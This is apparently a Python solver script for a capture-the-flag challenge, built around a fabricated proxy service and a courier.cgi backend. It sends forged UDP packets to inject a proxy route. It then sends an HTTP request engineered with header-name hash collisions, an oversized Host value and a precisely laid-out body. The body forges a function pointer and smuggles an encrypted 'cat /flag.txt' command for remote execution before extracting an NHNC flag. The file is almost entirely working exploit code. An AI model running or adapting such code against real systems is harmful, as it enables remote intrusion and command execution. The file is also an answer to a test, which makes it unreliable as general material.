#!/usr/bin/env python3
import re
import secrets
import socket
import struct
import sys
import time
from urllib.parse import urlparse

MASK32 = (1 << 32) - 1
MASK64 = (1 << 64) - 1
MAGIC = 0x89543217
EXPLOIT_PATH = "/7tqqrnlm5"
BODY_LEN = 0x200
RUN_FILTER = 0x4022AC
SPECIAL_HEADER = "-tveemh"
SPECIAL_VALUE = "raw"
COLLISION_HEADER = "l"
COLLISION_COUNT = 30


def u32(x): return x & MASK32
def u64(x): return x & MASK64

def rol32(x, n):
    n &= 31
    return u32((x << n) | (x >> ((32 - n) & 31)))


def ror32(x, n):
    n &= 31
    return u32((x >> n) | (x << ((32 - n) & 31)))


def rol64(x, n):
    n &= 63
    return u64((x << n) | (x >> ((64 - n) & 63)))


def ror64(x, n):
    n &= 63
    return u64((x >> n) | (x << ((64 - n) & 63)))


def fnv1a32(data: bytes) -> int:
    h = 0x811C9DC5
    for b in data:
        h = u32((h ^ b) * 0x01000193)
    return h


def djb2(data: bytes) -> int:
    h = 5381
    for b in data:
        h = u32(h * 33 + b)
    return h


def mix64(x: int) -> int:
    x = u64((x ^ (x >> 30)) * 0xBF58476D1CE4E5B9)
    x = u64((x ^ (x >> 27)) * 0x94D049BB133111EB)
    return u64(x ^ (x >> 31))


def udp_checksum(data: bytes, seed: int) -> int:
    state = u32((seed & 0xFF) ^ len(data) ^ 0x9E3779B9)
    evolving = seed
    selector = seed & 0xFF
    for i, byte in enumerate(data):
        value = byte + (evolving & 0xFF)
        mode = (i ^ selector) & 3
        if mode == 0:
            nxt = state ^ u32(value << ((i & 3) * 8))
        elif mode == 1:
            nxt = u32(state + rol32(value ^ 0x41, (i & 7) + 3))
        elif mode == 2:
            nxt = state ^ ror32(u32(value * 0x10101), (i & 7) + 1)
        else:
            nxt = u32(state + ((state >> 11) ^ value))
        state = u32(rol32(nxt, 5) * 0x045D9F3B + 0x27100001)
        evolving = u32(evolving + 17)
    return state ^ 0xA5C31E2D


def lease_token(challenge: int) -> int:
    raw = int.from_bytes(struct.pack(">I", challenge), "little")
    left = u32((challenge ^ 0x7F4A7C15) * 0x045D9F3B + 0x27100001)
    left = rol32(left, ((raw >> 24) & 7) + 5)
    right = u32(challenge - 0x5A3CE1D3)
    right = ror32(right, ((raw >> 16) & 7) + 3)
    return 0x31415927 if left == right else left ^ right


def route_crypt(data: bytes, key: int) -> bytes:
    seq = 0x31
    out = bytearray()
    for byte in data:
        out.append(byte ^ seq ^ key)
        seq = (seq + 0x0D) & 0xFF
    return bytes(out)


def install_route(host: str, port: int, target: str) -> None:
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.settimeout(1)
    addr = (host, port)
    challenge = secrets.randbits(32) or 0x13371337

    hello = bytearray(struct.pack(">I", MAGIC))
    hello += bytes([0x03, 0x36])
    hello += struct.pack(">I", challenge)
    hello += struct.pack(">I", udp_checksum(hello[4:10], (challenge ^ 0xA7) & 0xFF))

    token = lease_token(challenge)
    path = EXPLOIT_PATH.encode()
    upstream = target.encode()
    selector = secrets.randbelow(256)
    key = selector ^ 0xA7

    update = bytearray(struct.pack(">I", MAGIC))
    update += bytes([0x03, 0x71, 0x22, selector])
    update += struct.pack(">HHI", len(path), len(upstream), token)
    update += route_crypt(path, key)
    update += route_crypt(upstream, key)
    update += struct.pack(">I", udp_checksum(update[4:], key))

    # UDP has no acknowledgement, so send a few copies.
    for _ in range(3):
        udp.sendto(hello, addr)
        time.sleep(0.04)
    for _ in range(3):
        udp.sendto(update, addr)
        time.sleep(0.04)
    udp.close()


def analyze_header_names(headers):
    counts = [0] * 32
    duplicates = [0] * 32
    max_dup = 0
    max_bucket = 0
    flag_a = 0
    flag_b = 0

    for name, value in headers:
        normalized = name.lower().replace("_", "-")[:95].encode()
        nh = djb2(normalized)
        bucket = nh & 31
        old = counts[bucket]
        counts[bucket] += 1
        if old:
            duplicates[bucket] += 1
        if duplicates[bucket] > max_dup:
            max_dup = duplicates[bucket]
            max_bucket = bucket

        raw_value = value.lstrip(" \t").encode()
        state = 0x811C9DC5
        value_gate = state
        for byte in raw_value:
            value_gate = u32(byte ^ state)
            state = u32(value_gate * 0x01000193)
        if nh == 0x89424AE8 and value_gate == 0x5C547BEB:
            flag_a = 1
        if nh == 0xA2E31E1B and value_gate == 0x5C547BEB:
            flag_b = 1

    collision = int(max_dup > 28 and max_bucket == 17)
    return flag_a, flag_b, collision, max_bucket, max_dup


def marker_cookie(bucket: int, pressure: int, fold: int) -> int:
    x = u64((pressure << 9) ^ (fold << 21) ^ bucket ^ 0x434F555249455237)
    x = u64(x * 0x9E3779B97F4A7C15)
    x = rol64(x, (fold & 15) + 7)
    return x ^ 0xA24BAED4963EE407


def heap_layout_slot(bucket: int, pressure: int, fold: int, body_len: int) -> int:
    x = u64((fold << 32) ^ (pressure << 7))
    x ^= u64(body_len * 0x9E3779B97F4A7C15)
    x ^= u64(bucket << 19)
    x ^= 0x6C61796F75745F30
    return mix64(x) & 3


def heap_layout_slide(bucket: int, pressure: int, fold: int, body_len: int, layout_seed: int, cookie: int) -> int:
    x = u64(body_len * 0xD6E8FEB86659FD93)
    x ^= layout_seed ^ cookie
    x ^= u64(fold << 23)
    x ^= u64(pressure << 51)
    x ^= 0x736C6964655F3130
    return (mix64(x) % 3) * 8


def jmp_key(pressure: int, fold: int, layout_seed: int) -> int:
    return mix64(u64((fold << 11) ^ (pressure << 47) ^ layout_seed ^ 0x6A73696D705F6275))


def tape_stream(bucket: int, pressure: int, fold: int, layout_seed: int, index: int, length: int, cookie: int) -> int:
    x = u64((pressure << 19) ^ index ^ (length << 7))
    x ^= rol64(layout_seed, (index & 15) + 3)
    x ^= u64(fold << 32)
    x ^= 0x544150455F4C4F47
    x = u64(x + u64(index * 0x9E3779B97F4A7C15) + cookie)
    y = mix64(x)
    return u32(y ^ (y >> 17) ^ (y >> 41))


def build_request() -> bytes:
    # Header names determine bucket/pressure. The Host value itself does not
    # affect those two fields, so calculate the required 48-bit Host nonce
    # after measuring the header layout.
    headers = [
        ("Host", ""),
        ("Content-Length", str(BODY_LEN)),
        ("Connection", "close"),
        (SPECIAL_HEADER, SPECIAL_VALUE),
    ]
    headers += [(COLLISION_HEADER, "x") for _ in range(COLLISION_COUNT)]

    flag_a, flag_b, collision, bucket, pressure = analyze_header_names(headers)
    if (flag_a, flag_b, collision) != (0, 1, 1):
        raise RuntimeError(
            f"header layout invalid: a={flag_a} b={flag_b} collision={collision} "
            f"bucket={bucket} pressure={pressure}"
        )

    layout_seed = mix64(u64((bucket << 44) ^ (pressure << 19) ^ 0x484570243E202F2C))
    host_nonce = u64((BODY_LEN << 7) ^ layout_seed ^ 0x5353495F504F5354) & 0xFFFFFFFFFFFF
    headers[0] = ("Host", "A" * 1368 + f"{host_nonce:012x}" + ":")

    request_line = f"POST {EXPLOIT_PATH} HTTP/1.1\r\n"
    head_text = request_line + "".join(f"{k}: {v}\r\n" for k, v in headers) + "\r\n"
    head = head_text.encode()

    fold = fnv1a32(head)
    cookie = marker_cookie(bucket, pressure, fold)
    slot = heap_layout_slot(bucket, pressure, fold, BODY_LEN)
    slide = heap_layout_slide(bucket, pressure, fold, BODY_LEN, layout_seed, cookie)

    lane_seed = u32(fold ^ u32(pressure * 0x045D9F3B))
    lane_seed ^= 0x6A09E667
    lane_seed ^= lane_seed >> 16
    lane_seed = u32(lane_seed * 0x7FEB352D)
    lane_seed ^= lane_seed >> 15
    lane = lane_seed & 7
    copy_offset = slide + lane

    body = bytearray(BODY_LEN)

    def put_body(off, raw):
        body[off:off + len(raw)] = raw

    def put_abs(off, raw):
        index = off - copy_offset
        if index < 0 or index + len(raw) > len(body):
            raise RuntimeError(f"target offset out of body: abs={off:#x} copy={copy_offset}")
        body[index:index + len(raw)] = raw

    # Conditions checked by cgid and again by courier.cgi.
    key = jmp_key(pressure, fold, layout_seed)
    put_body(0x49, struct.pack("<Q", 0x58))
    put_body(0x58, struct.pack("<Q", 0x58))
    put_body(0x80, struct.pack("<Q", key ^ 0x9C8E949AA062989E))
    put_body(0x88, struct.pack("<Q", key ^ 0x01A00000))
    chain32 = u32(layout_seed) ^ u32(cookie)
    put_body(0x90, struct.pack("<Q", key ^ rol64(chain32, 17)))
    put_body(0xD0, struct.pack("<Q", 0xF8))
    put_body(0xD8, struct.pack("<Q", 0x5245545F414C4947))
    put_body(0xE0, struct.pack("<Q", 0x53595354454D5F31))

    xor_seed = layout_seed ^ cookie
    gate = mix64(
        u64((fold << 32) ^ (pressure << 23) ^ (slot << 57))
        ^ u64(BODY_LEN * 0x94D049BB133111EB)
        ^ u64(slide << 48)
        ^ xor_seed
        ^ 0x7072656C75646531
    )

    put_abs(0x107, struct.pack("<Q", gate ^ 0x0000535441474532))
    check32 = ror64(u64((fold << 17) ^ gate), (pressure & 7) + 5)
    put_abs(0x10F, struct.pack("<I", u32(check32)))
    check16 = rol64(gate, bucket + 3) ^ BODY_LEN ^ 0x6D5A
    put_abs(0x113, struct.pack("<H", check16 & 0xFFFF))

    marker = bytearray()
    for i in range(17):
        value = (9 * i + 0x31)
        value ^= mix64(u64(i * 0x9E3779B97F4A7C15 + gate)) & 0xFF
        value ^= (BODY_LEN >> (i & 7)) & 0xFF
        value ^= (fold >> ((i & 3) * 8)) & 0xFF
        marker.append(value & 0xFF)
    put_abs(0x115, marker)

    cache_gate = mix64(
        u64((fold << 33) ^ (pressure << 48) ^ (slot << 12))
        ^ u64(BODY_LEN * 0xA24BAED4963EE407)
        ^ u64(slide << 56)
        ^ xor_seed
        ^ 0x7463616368655F31
    )
    put_abs(0x126, struct.pack("<Q", cache_gate))
    put_abs(0x146, struct.pack("<Q", cookie))

    desired = b"cat /flag.txt"
    length = len(desired)
    encrypted = bytearray()
    for i, byte in enumerate(desired):
        stream = tape_stream(bucket, pressure, fold, layout_seed, i, length, cookie)
        encrypted.append(byte ^ ((23 * i - 89) & 0xFF) ^ (stream & 0xFF))

    state = u32((fold ^ u32(pressure * 0x045D9F3B)) ^ length ^ 0x811C9DC5)
    for i, byte in enumerate(encrypted):
        stream = tape_stream(bucket, pressure, fold, layout_seed, i, length, cookie)
        state = u32((byte + (stream & 0xFF)) ^ state)
        state = u32(state * 0x01000193)
        state ^= state >> 13
    checksum = state ^ 0x6D2B79F5

    put_abs(0x13E, struct.pack("<I", length))
    put_abs(0x142, struct.pack("<I", checksum))
    put_abs(0x156, encrypted)

    ptr_mix = cookie
    ptr_mix ^= u64(fold << 28)
    ptr_mix ^= u64(checksum << 17)
    ptr_mix ^= u64(length << 49)
    ptr_mix ^= u64(BODY_LEN * 0xD6E8FEB86659FD93)
    ptr_mix ^= rol64(layout_seed, 9)
    ptr_mix ^= 0xFEEDFACE43474931
    ptr_mix = mix64(ptr_mix)

    shift = ((checksum ^ length ^ fold ^ u32(layout_seed)) & 31) + 13
    before_rotate = rol64(RUN_FILTER ^ ptr_mix, shift)
    stored_ptr = ror64(ptr_mix, 17) ^ u64(before_rotate - 0xE9A9984E61C88607)
    put_abs(0x14E, struct.pack("<Q", stored_ptr))

    print(
        f"[*] header fold={fold:08x} bucket={bucket} pressure={pressure} "
        f"slide={slide} lane={lane} slot={slot}"
    )
    return head + body


def send_http(host: str, port: int, request: bytes, timeout: float = 8.0) -> bytes:
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    try:
        sock.sendall(request)
        sock.shutdown(socket.SHUT_WR)
        chunks = []
        while True:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)
    finally:
        sock.close()


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url> [upstream]", file=sys.stderr)
        print(f"Example: {sys.argv[0]} http://127.0.0.1:18080 127.0.0.1:17000", file=sys.stderr)
        raise SystemExit(1)

    raw_url = sys.argv[1]
    if "://" not in raw_url:
        raw_url = "http://" + raw_url
    parsed = urlparse(raw_url)
    host = parsed.hostname
    if not host:
        raise SystemExit("invalid URL")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    if parsed.scheme == "https":
        raise SystemExit("solver uses raw HTTP; pass the HTTP instance URL")

    upstream = sys.argv[2] if len(sys.argv) > 2 else "courier:7000"
    print(f"[*] Target: http://{host}:{port}")
    print(f"[*] Injecting route {EXPLOIT_PATH} -> {upstream}")
    request = build_request()

    last = b""
    for attempt in range(1, 4):
        install_route(host, port, upstream)
        time.sleep(0.12)
        last = send_http(host, port, request)
        text = last.decode("utf-8", "replace")
        match = re.search(r"NHNC\{[^\r\n}]*\}", text)
        if match:
            print(f"<FLAG>{match.group(0)}</FLAG>")
            return
        print(f"[-] Attempt {attempt}: flag belum keluar")
        if text:
            body = text.split("\r\n\r\n", 1)[-1]
            print(f"    response: {body[:160]!r}")
        time.sleep(0.15)

    print(last.decode("utf-8", "replace"))
    raise SystemExit("exploit failed")


if __name__ == "__main__":
    main()
